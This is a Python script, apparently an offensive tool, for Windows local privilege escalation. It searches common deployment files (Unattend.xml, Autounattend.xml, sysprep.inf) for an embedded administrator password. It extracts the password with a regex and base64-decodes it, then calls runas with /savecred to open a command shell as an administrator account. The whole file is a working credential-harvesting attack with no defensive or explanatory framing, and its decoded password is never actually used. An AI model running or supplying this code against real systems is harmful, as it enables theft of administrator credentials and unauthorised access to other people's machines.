#!/usr/bin/env python3
"""
    Documentation
"""
import os
import re
import base64
import subprocess

def find_common_file():
    paths = [
        "C:\\Windows\\Panther\\Unattend.xml",
        "C:\\Windows\\Panther\\Autounattend.xml",
        "C:\\Windows\\System32\\sysprep\\sysprep.inf"
        ]
    for value in paths:
        if os.path.exists(value):
            print(value)
            return value

def extract_pass(file):
    with open(file, 'r') as f:
        credentials = re.search(r'<AdministratorPassword>\s*<Value>(.*?)</Value>', f.read(), re.DOTALL)
        return credentials.group(1).strip()

def crack_the_fck_pass(data):
    password = base64.b64decode(data + "==").decode('utf-8')
    return password

def open_session(user):
    cmd = f'runas /user:{user} /savecred "cmd.exe"'
    subprocess.run(cmd, shell=True)

file = find_common_file()
if file:
    psw = extract_pass(file)
    if psw:
        password = crack_the_fck_pass(psw)
        open_session("SuperAdministrator")

